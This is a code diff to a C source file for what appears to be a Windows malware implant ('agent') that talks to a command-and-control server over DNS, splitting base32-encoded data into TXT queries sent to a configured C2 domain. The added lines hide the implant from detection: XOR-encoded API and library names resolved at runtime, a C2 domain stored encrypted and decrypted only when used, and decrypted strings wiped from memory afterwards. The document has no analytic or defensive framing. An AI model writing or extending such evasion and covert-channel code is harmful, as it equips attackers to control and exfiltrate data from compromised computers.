@@ -16,6 +16,7 @@
  * Uses dnsapi.dll DnsQuery_W for queries (no raw sockets needed).
  */
 #include "agent.h"
+#include "api_resolve.h"
 
 /* DNS API imports — resolved at runtime to avoid static linking */
 typedef DNS_STATUS (WINAPI *DnsQueryW_t)(PCWSTR, WORD, DWORD, PVOID, PDNS_RECORD*, PVOID);
@@ -77,13 +78,30 @@ static int base32_decode(const char *in, int in_len, unsigned char *out, int out
 
 BOOL dns_init(void) {
     if (CONFIG_DNS_ENABLED != 1) return FALSE;
-    if (CONFIG_DNS_DOMAIN[0] == '\0') return FALSE;
+    /* Check if DNS domain is configured */
+    char dns_dom_dec[256];
+    DECRYPT_CONFIG(dns_dom_dec, DNS_DOMAIN);
+    if (dns_dom_dec[0] == '\0') {
+        SecureZeroMemory(dns_dom_dec, sizeof(dns_dom_dec));
+        return FALSE;
+    }
+    SecureZeroMemory(dns_dom_dec, sizeof(dns_dom_dec));
 
-    g_hDnsApi = LoadLibraryA("dnsapi.dll");
+    char _sd[] = {'d'^0x5A,'n'^0x5A,'s'^0x5A,'a'^0x5A,'p'^0x5A,'i'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sd[_i];_i++) _sd[_i]^=0x5A;
+    g_hDnsApi = LoadLibraryA(_sd);
+    SecureZeroMemory(_sd, sizeof(_sd));
     if (!g_hDnsApi) return FALSE;
 
-    pDnsQuery_W = (DnsQueryW_t)GetProcAddress(g_hDnsApi, "DnsQuery_W");
-    pDnsRecordListFree = (DnsRecordListFree_t)GetProcAddress(g_hDnsApi, "DnsRecordListFree");
+    char _sq[] = {'D'^0x5A,'n'^0x5A,'s'^0x5A,'Q'^0x5A,'u'^0x5A,'e'^0x5A,'r'^0x5A,'y'^0x5A,'_'^0x5A,'W'^0x5A,0};
+    for(int _i=0;_sq[_i];_i++) _sq[_i]^=0x5A;
+    pDnsQuery_W = (DnsQueryW_t)GetProcAddress(g_hDnsApi, _sq);
+    SecureZeroMemory(_sq, sizeof(_sq));
+
+    char _sf[] = {'D'^0x5A,'n'^0x5A,'s'^0x5A,'R'^0x5A,'e'^0x5A,'c'^0x5A,'o'^0x5A,'r'^0x5A,'d'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,'F'^0x5A,'r'^0x5A,'e'^0x5A,'e'^0x5A,0};
+    for(int _i=0;_sf[_i];_i++) _sf[_i]^=0x5A;
+    pDnsRecordListFree = (DnsRecordListFree_t)GetProcAddress(g_hDnsApi, _sf);
+    SecureZeroMemory(_sf, sizeof(_sf));
 
     if (!pDnsQuery_W || !pDnsRecordListFree) {
         FreeLibrary(g_hDnsApi);
@@ -139,8 +157,10 @@ BOOL dns_send_recv(const unsigned char *packet, DWORD packet_len,
     int chunks = (b32_len + DNS_DATA_PER_Q - 1) / DNS_DATA_PER_Q;
     if (chunks > 255) chunks = 255; /* Max 256 chunks */
 
+    char dns_domain_dec[256];
+    DECRYPT_CONFIG(dns_domain_dec, DNS_DOMAIN);
     wchar_t wDomain[256];
-    MultiByteToWideChar(CP_UTF8, 0, CONFIG_DNS_DOMAIN, -1, wDomain, 256);
+    MultiByteToWideChar(CP_UTF8, 0, dns_domain_dec, -1, wDomain, 256);
 
     /* Collect TXT responses from the last query */
     Buffer resp_buf;
@@ -172,7 +192,7 @@ BOOL dns_send_recv(const unsigned char *packet, DWORD packet_len,
         }
 
         /* Append C2 domain */
-        snprintf(query_name + qpos, sizeof(query_name) - qpos, "%s", CONFIG_DNS_DOMAIN);
+        snprintf(query_name + qpos, sizeof(query_name) - qpos, "%s", dns_domain_dec);
 
         /* Convert to wide */
         wchar_t wQuery[512];
@@ -224,6 +244,7 @@ BOOL dns_send_recv(const unsigned char *packet, DWORD packet_len,
     }
 
     free(b32_data);
+    SecureZeroMemory(dns_domain_dec, sizeof(dns_domain_dec));
 
     if (ok && resp_buf.len > 0) {
         *response = resp_buf.data;
